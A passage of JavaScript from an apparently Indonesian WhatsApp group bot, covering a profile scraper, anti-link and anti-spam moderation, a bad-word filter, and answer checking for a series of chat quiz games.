        "cookie": "_inst_key=SFMyNTY.g3QAAAABbQAAAAtfY3NyZl90b2tlbm0AAAAYWGhnNS1uWVNLUU81V1lzQ01MTVY2R0h1.fI2xB2dYYxmWqn7kyCKIn1baWw3b-f7QvGDfDK2WXr8",
        "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
      }
    }).then(res => {
      const $ = cheerio.load(res.data)
      const result = {
        profile: $('#user-page > div.user > div.row > div > div.user__img').attr('style').replace(/(background-image: url\(\'|\'\);)/gi, ''),
        fullname: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > div > a > h1').text(),
        username: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > div > h4').text(),
        post: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(1)').text().replace(' Posts',''),
        followers: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(2)').text().replace(' Followers',''),
        following: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(3)').text().replace(' Following',''),
        bio: $('#user-page > div.user > div > div.col-md-5.my-3 > div').text()
      }
      resolve(result)
    })
  })
}

async function replyprem(teks) {
    replyviex(`Fitur ini untuk pengguna premium, hubungi pemilik untuk menjadi pengguna premium`)
}
        // Autosticker gc
        if (isAutoSticker) {
            if (/image/.test(mime) && !/webp/.test(mime)) {
let mediac = await quoted.download()
await TradzSigma.sendImageAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
console.log(`Auto sticker detected`)
            } else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return
let mediac = await quoted.download()
await TradzSigma.sendVideoAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
            }
        }
//=========================================\\
// Auto download tiktok

//=========================================\\
//Auto Download Video Instagram

//=========================================\\
//Auto Download Video Facebook
//if(budy.includes('https://www.facebook.com/')){
//
//=========================================\\
if (m.isGroup && isAlreadyResponList(m.chat, body.toLowerCase(), db_respon_list)) {
var get_data_respon = getDataResponList(m.chat, body.toLowerCase(), db_respon_list)
if (get_data_respon.isImage === false) {
TradzSigma.sendMessage(m.chat, { text: sendResponList(m.chat, body.toLowerCase(), db_respon_list) }, {
quoted: m
})
} else {
TradzSigma.sendMessage(m.chat, {
  image: await getBuffer(get_data_respon.image_url),
  caption: get_data_respon.response,
}, {
  quoted: m
})
}
}
//=========================================\\
        // Grup Only
        if (!m.isGroup && !TradID && db.settings[botNumber].onlygrub ) {
        	if (isCmd){
            return;
            }
        }
        // Private Only
        if (!TradID && db.settings[botNumber].onlypc && m.isGroup) {
        	if (isCmd){
	         return;
	     }
	}
	if (db.data.chats[m.chat] && db.data.chats[m.chat].antilink) {
    if (budy.match(/https?:\/\/[^\s]+/i)) {
        if (isAdmins) return replyviex(`Admin bebas`)
        if (isOwner) return replyviex(`Owner bebas`)
        
        try {
            // Hapus pesan
            await TradzSigma.sendMessage(m.chat, {
                delete: {
                    remoteJid: m.chat,
                    fromMe: false,
                    id: m.key.id,
                    participant: m.sender
                }
            })

            // Keluarkan pengirim dari grup
            await TradzSigma.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
        } catch (err) {
            console.error('Gagal hapus pesan atau keluarkan member:', err)
        }
    }
}
	if (cekpesan) {
      const chatId = m.key.remoteJid;
      const senderId = m.key.participant || m.key.remoteJid;
      if (!global.db.chats[chatId]) global.db.chats[chatId] = {};
      if (!global.db.chats[chatId].totalChat) global.db.chats[chatId].totalChat = {};
      global.db.chats[chatId].totalChat[senderId] = (global.db.chats[chatId].totalChat[senderId] || 0) + 1;
      saveDB(global.db);
      const msgContent = m.message.conversation || (m.message.extendedTextMessage && m.message.extendedTextMessage.text) || '';
	}
        if (Antilinkgc) {
        if (budy.match(`chat.whatsapp.com`)) {
        if (!isBotAdmins) return replyviex('_Bot Harus Menjadi Admin Terlebih Dahulu_')
        let gclink = (`https://chat.whatsapp.com/`+await TradzSigma.groupInviteCode(m.chat))
        let isLinkThisGc = new RegExp(gclink, 'i')
        let isgclink = isLinkThisGc.test(m.text)
        if (isgclink) return TradzSigma.sendMessage(m.chat, {text: `\`\`\`「 Group Link Detected 」\`\`\`\n\n Anda tidak akan di kick oleh bot karena yang Anda kirim adalah tautan ke grup ini`})
        if (isAdmins) return TradzSigma.sendMessage(m.chat, {text: `\`\`\`「 Group Link Detected 」\`\`\`\n\n Admin mengirimkan link, admin mah bebas memposting link apapun`})
        if (TradID) return TradzSigma.sendMessage(m.chat, {text: `\`\`\`「 Group Link Detected 」\`\`\`\n\n owner telah mengirim tautan, owner bebas memposting tautan apa pun`})
        kice = m.sender
        await TradzSigma.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
      
			TradzSigma.sendMessage(from, {text:`\`\`\`「 Tautan Terdeteksi 」\`\`\`\n\n@${m.sender.split("@")[0]} telah mengirimkan tautan dan berhasil dihapus\n> MELANGGAR 3X ADMIN BAKAL NGEKICK😹`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
            }            
        }
       
        if (Antilinkch) {
        if (budy.match(`whatsapp.com`)) {
        if (!isBotAdmins) return replyviex('_Bot Harus Menjadi Admin Terlebih Dahulu_')
        let gclink = (`https://whatsapp.com/channel/`+await TradzSigma.groupInviteCode(m.chat))
        let isLinkThisGc = new RegExp(gclink, 'i')
        let isgclink = isLinkThisGc.test(m.text)
        if (isgclink) return TradzSigma.sendMessage(m.chat, {text: `\`\`\`「 Channel Link Detected 」\`\`\`\n\n Anda tidak akan di kick oleh bot karena yang Anda kirim adalah tautan ke grup ini`})
        if (isAdmins) return TradzSigma.sendMessage(m.chat, {text: `\`\`\`「 Channel Link Detected 」\`\`\`\n\n Admin mengirimkan link, admin mah bebas memposting link apapun`})
        if (TradID) return TradzSigma.sendMessage(m.chat, {text: `\`\`\`「 Channel Link Detected 」\`\`\`\n\n owner telah mengirim tautan, owner bebas memposting tautan apa pun`})
        kice = m.sender
        await TradzSigma.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
      
			TradzSigma.sendMessage(from, {text:`\`\`\`「 Tautan Terdeteksi 」\`\`\`\n\n@${m.sender.split("@")[0]} telah mengirimkan tautan dan berhasil dihapus\n> MELANGGAR 3X ADMIN BAKAL NGEKICK😹`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
            }            
        }
        if (antiwame) {
        if (budy.includes("Wa.me") || budy.includes("wa.me")) {
        if (!isBotAdmins) return replyviex('_Bot Harus Menjadi Admin Terlebih Dahulu_')
        let gclink = (`https://Wa.me/`+await TradzSigma.groupInviteCode(m.chat))
        let isLinkThisGc = new RegExp(gclink, 'i')
        let isgclink = isLinkThisGc.test(m.text)
        if (isgclink) return TradzSigma.sendMessage(m.chat, {text: `\`\`\`「 Wa.me Detected 」\`\`\`\n\n Anda tidak akan di kick oleh bot karena yang Anda kirim adalah tautan ke grup ini`})
        if (isAdmins) return TradzSigma.sendMessage(m.chat, {text: `\`\`\`「 Wa.me Detected 」\`\`\`\n\n Admin mengirimkan link, admin mah bebas memposting link apapun`})
        if (TradID) return TradzSigma.sendMessage(m.chat, {text: `\`\`\`「 Wa.me Detected 」\`\`\`\n\n owner telah mengirim tautan, owner bebas memposting tautan apa pun`})
        kice = m.sender
        await TradzSigma.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
      
			TradzSigma.sendMessage(from, {text:`\`\`\`「 Tautan Terdeteksi 」\`\`\`\n\n@${m.sender.split("@")[0]} telah mengirimkan tautan dan berhasil dihapus\n> MELANGGAR 3X ADMIN BAKAL NGEKICK😹`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
            }            
        }
 
//antivirtex by xeon
  if (antiVirtex) {
  if (budy.length > 3500) {
  if (!isBotAdmins) return replyviex('_Bot Harus Menjadi Admin Terlebih Dahulu_')
          await TradzSigma.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			
			TradzSigma.sendMessage(from, {text:`\`\`\`「 Virus Detected 」\`\`\`\n\n@${m.sender.split("@")[0]}  because of sending virus in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
			
  }
  }
//anti bad words by xeon
//anti bad words by xeon
if (antiToxic) {
  if (Saru.includes(messagesD)) { // Jika pesan mengandung kata-kata kasar
    if (m.text) {
      // 1. Hapus pesan kasar
      await TradzSigma.sendMessage(m.chat, {
        delete: {
          remoteJid: m.chat, // Grup tempat pesan dikirim
          fromMe: false,
          id: m.key.id, // ID pesan yang akan dihapus
          participant: m.key.participant // Pengirim pesan
        }
      });
      
      // 2. Kirim peringatan ke grup
      const peringatan = `「 DETEKSI KATA KASAR 」\n\n@${m.sender.split("@")[0]} pesan kamu dihapus karena mengandung kata tidak pantas.`;
      await TradzSigma.sendMessage(
        m.chat, 
        {
          text: peringatan,
          mentions: [m.sender] // Mention pengguna
        }, 
        { quoted: m } // Reply ke pesan asli
      );
    }
  }
}

//ANTI LINK YT
        if (AntiLinkYoutubeVid) {
        if (budy.includes("https://youtube.")) {
        if (!isBotAdmins) return replyviex('_Bot Harus Menjadi Admin Terlebih Dahulu_')
        let gclink = (`https://youtube.com/watch?`)
        let isLinkThisGc = new RegExp(gclink, 'i')
        let isgclink = isLinkThisGc.test(m.text)
        if (isAdmins) return TradzSigma.sendMessage(m.chat, {text: `\`\`\`「 Link Video Yt Detected 」\`\`\`\n\n Admin mengirimkan link, admin mah bebas memposting link apapun`})
        if (TradID) return TradzSigma.sendMessage(m.chat, {text: `\`\`\`「 Link Video Yt Detected 」\`\`\`\n\n owner telah mengirim tautan, owner bebas memposting tautan apa pun`})
        kice = m.sender
        await TradzSigma.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
      
			TradzSigma.sendMessage(from, {text:`\`\`\`「 Tautan Terdeteksi 」\`\`\`\n\n@${m.sender.split("@")[0]} telah mengirimkan tautan dan berhasil dihapus\n> MELANGGAR 3X ADMIN BAKAL NGEKICK😹`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
            }            
            }

//antilink instagram by xeon
        if (AntiLinkInstagram)
        if (budy.includes("https://www.instagram.com/")){
        if (isAdmins) return TradzSigma.sendMessage(m.chat, {text: `\`\`\`「 Link Instagram Detected 」\`\`\`\n\n Admin mengirimkan link, admin mah bebas memposting link apapun`})
        if (TradID) return TradzSigma.sendMessage(m.chat, {text: `\`\`\`「 Link instagram Detected 」\`\`\`\n\n owner telah mengirim tautan, owner bebas memposting tautan apa pun`})
        kice = m.sender
        await TradzSigma.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			
TradzSigma.sendMessage(from, {text:`\`\`\`「 Instagram Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]}  because of sending instagram link in this group\n> MELANGGAR 3X ADMIN BAKAL NGEKICK😹`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink facebook by xeon
        if (AntiLinkFacebook)
        if (budy.includes("https://www.facebook.com/")){
        if (isAdmins) return TradzSigma.sendMessage(m.chat, {text: `\`\`\`「 Link Facebook Detected 」\`\`\`\n\n Admin mengirimkan link, admin mah bebas memposting link apapun`})
        if (TradID) return TradzSigma.sendMessage(m.chat, {text: `\`\`\`「 Link Faceboook Detected 」\`\`\`\n\n owner telah mengirim tautan, owner bebas memposting tautan apa pun`})
        kice = m.sender
        await TradzSigma.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			
TradzSigma.sendMessage(from, {text:`\`\`\`「 Facebook Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]}  because of sending facebook link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink telegram by xeon
   if (AntiLinkTelegram)
   if (budy.includes("https://t.me/")){
   if (AntiLinkTelegram)
   if (isAdmins) return TradzSigma.sendMessage(m.chat, {text: `\`\`\`「 Link Telegram Detected 」\`\`\`\n\n Admin mengirimkan link, admin mah bebas memposting link apapun`})
   if (TradID) return TradzSigma.sendMessage(m.chat, {text: `\`\`\`「 Link Telegram Detected 」\`\`\`\n\n owner telah mengirim tautan, owner bebas memposting tautan apa pun`})
        kice = m.sender
        await TradzSigma.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			
TradzSigma.sendMessage(from, {text:`\`\`\`「 Telegram Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Telah di kick karena mengirim tautan telegram di grup ini\n> MELANGGAR 3X ADMIN BAKAL NGEKICK😹`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
if (AntiLinkTiktok)
   if (budy.includes("https://www.tiktok.com/")){
        if (isAdmins) return TradzSigma.sendMessage(m.chat, {text: `\`\`\`「 Link Tiktok Detected 」\`\`\`\n\n Admin mengirimkan link, admin mah bebas memposting link apapun`})
        if (TradID) return TradzSigma.sendMessage(m.chat, {text: `\`\`\`「 Link Tiktok Detected 」\`\`\`\n\n owner telah mengirim tautan, owner bebas memposting tautan apa pun`})
        kice = m.sender
        await TradzSigma.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			
TradzSigma.sendMessage(from, {text:`\`\`\`「 Tiktok Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Telah di kick karena mengirim tautan tiktok di grup ini\n> MELANGGAR 3X ADMIN BAKAL NGEKICK😹`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink twitter by xeon
if (AntiLinkTwitter)
   if (budy.includes("https://x.com/")){
        if (isAdmins) return TradzSigma.sendMessage(m.chat, {text: `\`\`\`「 Link twitter Detected 」\`\`\`\n\n Admin mengirimkan link, admin mah bebas memposting link apapun`})
        if (TradID) return TradzSigma.sendMessage(m.chat, {text: `\`\`\`「 Link twitter Detected 」\`\`\`\n\n owner telah mengirim tautan, owner bebas memposting tautan apa pun`})
        kice = m.sender
        await TradzSigma.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			
TradzSigma.sendMessage(from, {text:`\`\`\`「 Twitter/X Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Telah di kick karena mengirim tautan twitter di grup ini\n> MELANGGAR 3X ADMIN BAKAL NGEKICK😹`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}

TradzSigma.family100 = TradzSigma.family100 ? TradzSigma.family100 : {};
if (from in TradzSigma.family100 && !m.key.fromMe ) {
    let similarity = require('similarity');
    let threshold = 0.72; // semakin tinggi nilai, semakin mirip
    let id = m.chat;
    let users = global.db.users[m.sender];
    let room = TradzSigma.family100[id];
    let text = budy.toLowerCase().replace(/[^\w\s\-]+/, '');
    let isSurrender = /^((me)?nyerah|surr?ender)$/i.test(budy);

    if (!isSurrender) {
        let index = room.jawaban.indexOf(text);

        if (index < 0) {
            if (Math.max(...room.jawaban.filter((_, index) => !room.terjawab[index]).map(jawaban => similarity(jawaban, text))) >= threshold) {
                return replyviex('Dikit lagi!');
            }
        }

        if (!isCmd && room.terjawab[index]) {
            return;
        }

        users.money += room.winScore;
        room.terjawab[index] = m.sender;
    }

    let isWin = room.terjawab.length === room.terjawab.filter(v => v).length;

    let caption = `*GAME FAMILY100*

*Soal:* ${room.soal}

Terdapat ${room.jawaban.length} jawaban${room.jawaban.find(v => v.includes(' ')) ? `
(beberapa jawaban terdapat spasi)
`: ''}
${isWin ? `*SEMUA JAWABAN TERJAWAB ✅*` : isSurrender ? '*MENYERAH ❌*' : ''}
${Array.from(room.jawaban, (jawaban, index) => {
    return isSurrender || room.terjawab[index] ? `(${index + 1}) ${jawaban} ${room.terjawab[index] ? '✓ ' + room.terjawab[index].split('@')[0] : ''}`.trim() : false;
}).filter(v => v).join('\n')}

${isSurrender ? '' : `+${room.winScore} Money tiap jawaban benar`}
    `.trim();

    TradzSigma.sendMessage(from, { text: `${caption}`, mentions: [room.terjawab + '@s.whatsapp.net'] }, { quoted: m }).then(msg => {
        TradzSigma.family100[id].msg = msg;
    }).catch(_ => _);

    if (isWin || isSurrender) {
        delete TradzSigma.family100[id];
    }
}
TradzSigma.tebaklagu = TradzSigma.tebaklagu ? TradzSigma.tebaklagu : {};
if (tebaklagu.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaklagu[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
   TradzSigma.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/14744917bea0185b52fb1.jpg' }, caption: `🎮 Tebak Lagu 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Lagu`}, {quoted:m}) 
 delete tebaklagu[m.sender.split('@')[0]]
} else console.log('*Jawaban Salah!*')
}

TradzSigma.tebakkata = TradzSigma.tebakkata ? TradzSigma.tebakkata : {}  
if (from in TradzSigma.tebakkata) {
let id = m.chat
let users = global.db.users[m.sender]
let json = JSON.parse(JSON.stringify(TradzSigma.tebakkata[id][1]))
kuis = true
if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
 users.money += 10000
 var teks = `🎮 Tebak Kata 🎮\n\nJawaban Benar 🎉\nHadiah : 10.000 money\n`
 replyviex(`${teks}`)
 clearTimeout(TradzSigma.tebakkata[id][2])
 delete TradzSigma.tebakkata[id]
} else console.log('*Jawaban Salah!*')
}
TradzSigma.tebakgambar = TradzSigma.tebakgambar ? TradzSigma.tebakgambar : {} 
if(from in TradzSigma.tebakgambar) {
kuis = true
let id = m.chat
let users = global.db.users[m.sender]
let json = JSON.parse(JSON.stringify(TradzSigma.tebakgambar[id][1]))
 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
   users.money += 10000
 var teks = `🎮 Tebak Gambar 🎮\n\nJawaban Benar 🎉\nHadiah : 10.000 money\n\nIngin bermain lagi? Silahkan Ketik TebakGambar`
 replyviex(`${teks}`)
 clearTimeout(TradzSigma.tebakgambar[id][3])
 delete TradzSigma.tebakgambar[id]
} else console.log('*Jawaban Salah!*')
}

TradzSigma.tebakbendera2 = TradzSigma.tebakbendera2 ? TradzSigma.tebakbendera2 : {};
if (tebakbendera2.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakbendera2[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
await replyviex('*Anda Telah menyerah*')
delete tebakbendera2[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
await TradzSigma.sendText(m.chat, `🎮 Tebak Bendera 🎮\n\nJawaban Benar 🎉`, m)
delete tebakbendera2[m.sender.split('@')[0]]
            } else console.log('*Jawaban Salah!*')
        }
TradzSigma.tebakbendera = TradzSigma.tebakbendera ? TradzSigma.tebakbendera : {};
if (tebakbendera.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakbendera[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
await replyviex('*Anda Telah menyerah*')
delete tebakbendera[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
await TradzSigma.sendText(m.chat, `🎮 Tebak Gambar 🎮\n\nJawaban Benar 🎉`, m)
delete tebakbendera[m.sender.split('@')[0]]
            } else console.log('*Jawaban Salah!*')
        }
TradzSigma.tebakkabupaten = TradzSigma.tebakkabupaten ? TradzSigma.tebakkabupaten : {};
 if (tebakkabupaten.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakkabupaten[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
await replyviex('*Anda Telah menyerah*')
delete tebakkabupaten[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
await TradzSigma.sendText(m.chat, `🎮 Tebak Kabupaten 🎮\n\nJawaban Benar 🎉`, m)
delete tebakkabupaten[m.sender.split('@')[0]]
            } else console.log('*Jawaban Salah!*')
        }
 TradzSigma.tebakkimia = TradzSigma.tebakkimia ? TradzSigma.tebakkimia : {};
        if (tebakkimia.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakkimia[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
await replyviex('*Anda Telah menyerah*')
delete tebakkimia[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
await TradzSigma.sendText(m.chat, `🎮 Tebak Kimia 🎮\n\nJawaban Benar 🎉`, m)
delete tebakkimia[m.sender.split('@')[0]]
            } else console.log('*Jawaban Salah!*')
        }
        
//=========================================\\
TradzSigma.tekateki = TradzSigma.tekateki ? TradzSigma.tekateki : {}  
if(from in TradzSigma.tekateki){
let users = global.db.users[m.sender]
const similarity = require('similarity')
const threshold = 0.72
let id = m.chat
 let json = JSON.parse(JSON.stringify(TradzSigma.tekateki[id][1]))

 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
users.money += TradzSigma.tekateki[id][2]
 var teks = `*GAME TEKATEKI*\n\nJawaban Kamu Benar!\n Hadiah : +${TradzSigma.tekateki[id][2]} Money 💸`
 replyviex(`${teks}`)
 clearTimeout(TradzSigma.tekateki[id][3])
 delete TradzSigma.tekateki[id]
 } else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) replyviex(`*Dikit Lagi!*`)
}
//=========================================\\
TradzSigma.tebakasahotak = TradzSigma.tebakasahotak ? TradzSigma.tebakasahotak : {};
if (tebakasahotak.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakasahotak[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
await replyviex('*Anda Telah menyerah*')
delete tebakasahotak[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
await TradzSigma.sendText(m.chat, `🎮 Asah Otak 🎮\n\nJawaban Benar 🎉`, m)
delete tebakasahotak[m.sender.split('@')[0]]
            } else console.log('*Jawaban Salah!*')
        }
//=========================================\\
        TradzSigma.siapaaku = TradzSigma.siapaaku ? TradzSigma.siapaaku : {}
if(from in TradzSigma.siapaaku){
const similarity = require('similarity')
const threshold = 0.72
let id = m.chat
let users = global.db.users[m.sender]
 let json = JSON.parse(JSON.stringify(TradzSigma.siapaaku[id][1]))

 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
users.money += TradzSigma.siapaaku[id][2]
var teks = `*GAME SIAPAKAH AKU*\n\nJawaban Kamu Benar!\n Hadiah : +${TradzSigma.siapaaku[id][2]} Money 💸`
   replyviex(`${teks}`)
 clearTimeout(TradzSigma.siapaaku[id][3])
 delete TradzSigma.siapaaku[id]
 } else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) replyviex(`*Dikit Lagi!*`)
// else reply(`*Salah!*`) 
}
//=========================================\\
        TradzSigma.susunkata = TradzSigma.susunkata ? TradzSigma.susunkata : {}  
if(from in TradzSigma.susunkata){
const similarity = require('similarity')
const threshold = 0.72
let id = m.chat
let users = global.db.users[m.sender]
 let json = JSON.parse(JSON.stringify(TradzSigma.susunkata[id][1]))

 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
users.money += TradzSigma.susunkata[id][2]
   var teks = `*GAME SUSUN KATA*\n\nJawaban Kamu Benar!\n Hadiah : +${TradzSigma.susunkata[id][2]} Money 💸`
replyviex(`${teks}`)
 clearTimeout(TradzSigma.susunkata[id][3])
 delete TradzSigma.susunkata[id]
 } else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) replyviex(`*Dikit Lagi!*`)
// else reply(`*Salah!*`)
 
}
//=========================================\\
TradzSigma.caklontong = TradzSigma.caklontong ? TradzSigma.caklontong : {};
if (caklontong.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = caklontong[m.sender.split('@')[0]]
deskripsi = caklontong_desk[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 TradzSigma.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/14744917bea0185b52fb1.jpg' }, caption: `🎮 Tebak Lontong 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Lontong`}, {quoted:m}) 
 delete caklontong[m.sender.split('@')[0]]
delete caklontong_desk[m.sender.split('@')[0]]
} else console.log('*Jawaban Salah!*')
}
TradzSigma.tebakkalimat = TradzSigma.tebakkalimat ? TradzSigma.tebakkalimat : {};
if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakkalimat[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 TradzSigma.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/14744917bea0185b52fb1.jpg' }, caption: `🎮 Tebak Kalimat 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Kalimat`}, {quoted:m}) 
 delete tebakkalimat[m.sender.split('@')[0]]
} else console.log('*Jawaban Salah!*')
}

//=========================================//
TradzSigma.tebaklirik = TradzSigma.tebaklirik ? TradzSigma.tebaklirik : {}  
if(from in TradzSigma.tebaklirik){
const similarity = require('similarity')
const threshold = 0.72
let id = m.chat
let users = global.db.users[m.sender]
let json = JSON.parse(JSON.stringify(TradzSigma.tebaklirik[id][1]))

 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
user.money += TradzSigma.tebaklirik[id][2]
 global.db.users[m.sender].exp += 10
   var teks = `*GAME TEBAK LIRIK*\n\nJawaban Kamu Benar!\n Hadiah : +${TradzSigma.tebaklirik[id][2]} Money 💸\n EXP: +10`
  replyviex(`${teks}`)
 clearTimeout(TradzSigma.tebaklirik[id][3])
 delete TradzSigma.tebaklirik[id]
 } else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) replyviex(`*Dikit Lagi!*`)
// else reply(`*Salah!*`)
 }
//=========================================\\
TradzSigma.tebaktebakan = TradzSigma.tebaktebakan ? TradzSigma.tebaktebakan : {};
if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaktebakan[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 TradzSigma.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/14744917bea0185b52fb1.jpg' }, caption: `🎮 Tebak Tebakan 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Tebakan`}, {quoted:m}) 
 delete tebaktebakan[m.sender.split('@')[0]]
} else console.log('*Jawaban Salah!*')
}
//antilink all by dinzyoimiya
if (AntiLinkAll)
   if (budy.includes("https://") || budy.includes("wa.me") || budy.includes("whatsapp.com") || budy.includes("Wa.me")){
           if (isAdmins) return TradzSigma.sendMessage(m.chat, {text: `\`\`\`「 Link All Detected 」\`\`\`\n\n Admin mengirimkan link, admin mah bebas memposting link apapun`})
        if (TradID) return TradzSigma.sendMessage(m.chat, {text: `\`\`\`「 Link All Detected 」\`\`\`\n\n owner telah mengirim tautan, owner bebas memposting tautan apa pun`})
        kice = m.sender
        await TradzSigma.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			
TradzSigma.sendMessage(from, {text:`\`\`\`「 Tautan Terdeteksi 」\`\`\`\n\n@${m.sender.split("@")[0]} telah mengirimkan tautan dan berhasil dihapus`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//ANTILINK JB
//antilink all by dinzyoimiya

//menu thingy
const timestamp = speed()
const latensi = speed() - timestamp
const mark = "0@s.whatsapp.net"

//menu image randomizer
let picaks = [flaming,fluming,flarun,flasmurf]
let picak = picaks[Math.floor(Math.random() * picaks.length)]

//emote
const emote = (satu, dua) => {
try{	    
const { EmojiAPI } = require("emoji-api")
const emoji = new EmojiAPI()
emoji.get(satu)
.then(emoji => {
TradzSigma.sendMessage(from, { caption: mess.success, image: {url: emoji.images[dua].url} }, {quoted:m})
})
} catch (e) {
replyviex("Emoji error, please enter another emoji\nNOTE : Just enter 1 emoji")
}
}

// Respon Cmd with media
if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.sticker)) {
let hash = global.db.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
    userJid: TradzSigma.user.id,
    quoted: m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, TradzSigma.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
    ...chatUpdate,
    messages: [proto.WebMessageInfo.fromObject(messages)],
    type: 'append'
}
TradzSigma.ev.emit('messages.upsert', msg)
}
 
switch (command) {
case 'ttc': case 'ttt': case 'tictactoe': {
